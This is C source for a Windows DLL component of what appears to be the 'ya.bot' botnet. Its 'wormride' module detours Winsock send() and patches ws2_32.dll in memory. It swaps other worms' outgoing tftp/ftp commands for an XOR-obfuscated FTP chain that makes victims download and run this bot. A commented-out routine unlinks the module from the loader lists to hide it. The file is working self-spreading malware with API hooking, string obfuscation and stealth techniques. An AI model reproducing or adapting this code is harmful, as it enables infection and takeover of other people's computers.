/*  ya.bot  */

#pragma optimize("gsy", on)
#pragma comment(linker, "/BASE:0x13570000") //0x13570000, 0x13140000, 0x19280000, 0x57800000
#pragma comment(linker, "/ENTRY:DllMain")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/IGNORE:4078")
#pragma comment(linker, "/MERGE:.rdata=.data") 
#pragma comment(linker, "/MERGE:.reloc=.data") 
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/RELEASE")
#pragma comment(linker, "/SECTION:.text, EWR")
#pragma comment(linker, "/STUB:..\\stub.dat")

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")

#ifndef NO_INSTALLWORMRIDE
#pragma comment(lib, "msvcrt.lib")
#pragma comment(lib, "ws2_32.lib")
#endif

#define _WIN32_WINNT 0x0400
#define  WIN32_LEAN_AND_MEAN
#define  WIN32_EXTRA_LEAN
#include <windows.h>

#ifndef NO_INSTALLWORMRIDE
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#include "xde.c"
#include "..\settings\externs.h"
#include "..\settings\config.h"
#endif
#include "..\settings\defines.h"

#ifndef NO_INSTALLWORMRIDE
char szReplace[512];

const char *string_wormridews232 = //ws2_32.dll
		"\xBE\xBA\xFB\x96\xFA\xFB\xE7\xAD\xA5\xA5";
const char *string_wormridetftpexe = //tftp.exe -i
		"\xBD\xAF\xBD\xB9\xE7\xAC\xB1\xAC\xE9\xE4\xA0";
const char *string_wormrideftpexe = //ftp -n -s:
		"\xAF\xBD\xB9\xE9\xE4\xA7\xE9\xE4\xBA\xF3";
const char *string_wormrideftpstring =
//echo open %s %i >> temp~987.dat&
//echo user %s %s >> temp~987.dat&
//echo get %s C:\%s >> temp~987.dat&
//echo quit >> temp~987.dat&
//ftp -n -s:temp~987.dat&
//del /Q temp~987.dat&
//C:\%s%s
		"\xAC\xAA\xA1\xA6\xE9\xA6\xB9\xAC\xA7\xE9\xEC\xBA\xE9\xEC\xA0\xE9\xF7\xF7\xE9\xBD\xAC\xA4"
		"\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAC\xAA\xA1\xA6\xE9\xBC\xBA\xAC\xBB\xE9\xEC\xBA"
		"\xE9\xEC\xBA\xE9\xF7\xF7\xE9\xBD\xAC\xA4\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAC\xAA"
		"\xA1\xA6\xE9\xAE\xAC\xBD\xE9\xEC\xBA\xE9\x8A\xF3\x95\xEC\xBA\xE9\xF7\xF7\xE9\xBD\xAC\xA4"
		"\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAC\xAA\xA1\xA6\xE9\xB8\xBC\xA0\xBD\xE9\xF7\xF7"
		"\xE9\xBD\xAC\xA4\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAF\xBD\xB9\xE9\xE4\xA7\xE9\xE4"
		"\xBA\xF3\xBD\xAC\xA4\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAD\xAC\xA5\xE9\xE6\x98\xE9"
		"\xBD\xAC\xA4\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\x8A\xF3\x95\xEC\xBA\xEC\xBA";

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by akcom
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool wormride_xdehook(LPVOID lpFunction, LPVOID lpDetour, FARPROC *pOldFunction)
{
	DWORD dwAddress, dwInstructionSize, dwOldFunctionSize = 0, dwOld;
	PBYTE byDetour, byFunction, byJump, byOldFunction, byPointer;
	xde_instr xde;
	if ((!lpFunction) || (!lpDetour))
			return FALSE;
		byFunction = (PBYTE)lpFunction;
		byDetour = (PBYTE)lpDetour;
	if ((IsBadCodePtr((FARPROC)byFunction)) || (IsBadCodePtr((FARPROC)byDetour)))
			return FALSE;
	if (byFunction[0] == 0xE9)
	{
			byJump = byFunction;
			dwAddress = *(PULONG)(byJump + 1);
			wormride_xdehook((PVOID)(dwAddress + (ULONG)byFunction + 5), lpDetour, pOldFunction);
	}
		byPointer = byFunction;
	while (dwOldFunctionSize < 5)
	{
			dwInstructionSize = xde_disasm(byPointer, &xde);
		if (xde.flag & C_STOP)
				return FALSE;
			dwOldFunctionSize += dwInstructionSize;
			byPointer += dwInstructionSize;
	}
		byOldFunction = (PBYTE)malloc(dwOldFunctionSize + 5);
		VirtualProtect(byOldFunction, dwOldFunctionSize + 5, PAGE_EXECUTE_READWRITE, &dwOld);
		memcpy(byOldFunction, byFunction, dwOldFunctionSize);
		byPointer = byOldFunction + dwOldFunctionSize;
		*byPointer = 0xE9;
		*(PULONG)(byPointer + 1) = ((byFunction + dwOldFunctionSize) -
				(byOldFunction + dwOldFunctionSize + 5));
		VirtualProtect(byOldFunction, dwOldFunctionSize + 5, dwOld | PAGE_EXECUTE, NULL);
		*(BYTE **)pOldFunction = byOldFunction;
		VirtualProtect(byFunction, dwOldFunctionSize + 5, PAGE_EXECUTE_READWRITE, &dwOld);
		memset(byFunction, 0x90, dwOldFunctionSize);
		*byFunction = 0xE9;
		*(PULONG)(byFunction + 1) = ((byDetour) - (byFunction + 5));
		VirtualProtect(byFunction, dwOldFunctionSize, dwOld, NULL);
		return TRUE;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by akcom
//botbotbotbotbotbotbotbotbotbotbotbotbot

void wormride_xdeunhook(LPVOID lpFunction, LPVOID lpOldFunction)
{
	DWORD dwInstructionLength, dwOld, dwTotalLength = 0;
	PBYTE byFunction, byOldFunction, byPointer;
	xde_instr xde;
		byFunction = (PBYTE)lpFunction;
		byOldFunction = (PBYTE)lpOldFunction;
		byPointer = byOldFunction;
	while (TRUE)
	{
			dwInstructionLength = xde_disasm(byPointer, &xde);
		if (xde.flag & C_STOP)
				break;
			dwTotalLength += dwInstructionLength;
			byPointer += dwInstructionLength;
	}
		VirtualProtect(lpFunction, dwTotalLength, PAGE_EXECUTE_READWRITE, &dwOld);
		memcpy(lpFunction, lpOldFunction, dwTotalLength);
		VirtualProtect(lpFunction, dwTotalLength, dwOld, NULL);
		free(lpOldFunction);
		return;
}

/*
//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Darawk
//http://www.darawk.com/
//botbotbotbotbotbotbotbotbotbotbotbotbot

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _ModuleInfoNode
{
	LIST_ENTRY LoadOrder;
	LIST_ENTRY InitOrder;
	LIST_ENTRY MemoryOrder;
	HMODULE baseAddress;
	unsigned long entryPoint;
	unsigned int size;
	UNICODE_STRING fullPath;
	UNICODE_STRING name;
	unsigned long flags;
	unsigned short LoadCount;
	unsigned short TlsIndex;
	LIST_ENTRY HashTable;
	unsigned long timestamp;
} ModuleInfoNode, *pModuleInfoNode;

typedef struct _ProcessModuleInfo
{
	unsigned int size;
	unsigned int initialized;
	HANDLE SsHandle;
	LIST_ENTRY LoadOrder;
	LIST_ENTRY InitOrder;
	LIST_ENTRY MemoryOrder;
} ProcessModuleInfo, *pProcessModuleInfo;

bool wormride_unlink(HMODULE hModule)
{
	ProcessModuleInfo *pmInfo;
	ModuleInfoNode *modInfo;
	_asm
	{
			mov eax, fs:[18h]
			mov eax, [eax + 30h]
			mov eax, [eax + 0Ch]
			mov pmInfo, eax
	}
		modInfo = (ModuleInfoNode *)(pmInfo->LoadOrder.Flink);
	while (modInfo->baseAddress && modInfo->baseAddress != hModule)
			modInfo = (ModuleInfoNode *)(modInfo->LoadOrder.Flink);
	if (!modInfo->baseAddress)
			return FALSE;
		modInfo->LoadOrder.Blink->Flink = modInfo->LoadOrder.Flink;
		modInfo->LoadOrder.Flink->Blink = modInfo->LoadOrder.Blink;
		modInfo->InitOrder.Blink->Flink = modInfo->InitOrder.Flink;
		modInfo->InitOrder.Flink->Blink = modInfo->InitOrder.Blink;
		modInfo->MemoryOrder.Blink->Flink = modInfo->MemoryOrder.Flink;
		modInfo->MemoryOrder.Flink->Blink = modInfo->MemoryOrder.Blink;
		modInfo->HashTable.Blink->Flink = modInfo->HashTable.Flink;
		modInfo->HashTable.Flink->Blink = modInfo->HashTable.Blink;
		memset(modInfo->fullPath.Buffer, 0, modInfo->fullPath.Length);
		memset(modInfo, 0, sizeof(ModuleInfoNode));
		return TRUE;
}
*/

char *wormride_getip()
{
	char szHostName[128];
	hostent *he;
	sockaddr_in sin;
	static char s_szIP[16];
	WSADATA wsadata;
	if (WSAStartup(0x0202, &wsadata) != 0)
			return NULL;
	if (gethostname(szHostName, sizeof(szHostName) - 1) == SOCKET_ERROR)
			return NULL;
		he = gethostbyname(szHostName);
	if (!he)
			return NULL;
		memcpy(&sin.sin_addr, he->h_addr_list[0], he->h_length);
		strncpy(s_szIP, inet_ntoa(sin.sin_addr), sizeof(s_szIP) - 1);
		WSACleanup();
		return s_szIP;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by neonew
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool wormride_patchwinsock()
{
	BYTE *byModule;
	DWORD dwAccess = PAGE_EXECUTE_READWRITE, dwOld = 0;
		byModule = (BYTE *)LoadLibrary(string_wormridews232);
	if (!byModule)
			return FALSE;
	if (VirtualProtect(&byModule[0x66EF], 5, dwAccess, &dwOld))
	{
		if ((byModule[0x66EF + 0] == 0xE8) &&
					(byModule[0x66EF + 1] == 0x60) &&
					(byModule[0x66EF + 2] == 0x08) &&
					(byModule[0x66EF + 3] == 0x00) &&
					(byModule[0x66EF + 4] == 0x00))
		{
				byModule[0x66EF + 0] = 0x33;
				byModule[0x66EF + 1] = 0xC0;
				byModule[0x66EF + 2] = 0x90;
				byModule[0x66EF + 3] = 0x90;
				byModule[0x66EF + 4] = 0x90;
		}
			VirtualProtect(&byModule[0x66EF], 5, dwOld, &dwAccess);
	}
		return TRUE;
}

void wormride_xor(char *pszBuffer, int nKey)
{
	int i;
	if (!pszBuffer)
			return;
	for (i = 0; i < (int)strlen(pszBuffer); i++)
			pszBuffer[i] ^= nKey;
		return;
}

typedef int (WINAPI *psend)(SOCKET s, const char *buf, int len, int flags);
psend sendNextHook;
int WINAPI wormride_detoursend(SOCKET s, const char *buf, int len, int flags)
{

#ifndef NO_DAEMONFTP
	char *p[2];
		p[0] = strstr(buf, string_wormridetftpexe);
		p[1] = strstr(buf, string_wormrideftpexe);
	if ((p[0]) || (p[1]))
	{
			buf = szReplace;
			len = strlen(szReplace);
	}
#endif

		return sendNextHook(s, buf, len, flags);
}
#endif

bool WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
{
	switch(dwReason)
	{
		case DLL_PROCESS_ATTACH:

#ifndef NO_INSTALLWORMRIDE
//				wormride_unlink(hModule); //Cant unload if used...

#ifndef NO_DAEMONFTP
				wormride_xor((char *)botfilename, xorkey);
				wormride_xor((char *)daemonftppass, xorkey);
				wormride_xor((char *)daemonftpuser, xorkey);
				wormride_xor((char *)string_wormridews232, xorkey);
				wormride_xor((char *)string_wormridetftpexe, xorkey);
				wormride_xor((char *)string_wormrideftpexe, xorkey);
				wormride_xor((char *)string_wormrideftpstring, xorkey);
				memset(szReplace, 0, sizeof(szReplace));
				_snprintf(szReplace, sizeof(szReplace) - 1,
						string_wormrideftpstring,
						wormride_getip(),
						daemonftpport, daemonftpuser, daemonftppass,
						botfilename, botfilename, botfilename,
						"\r\n");
#endif

				wormride_patchwinsock();
				wormride_xdehook((FARPROC)send, &wormride_detoursend, (FARPROC *)&sendNextHook);
#endif

				break;
		case DLL_PROCESS_DETACH:

#ifndef NO_INSTALLWORMRIDE
				wormride_xdeunhook((FARPROC)send, sendNextHook);
#endif

				FreeLibrary(hModule);
				break;
	}
		return TRUE;
}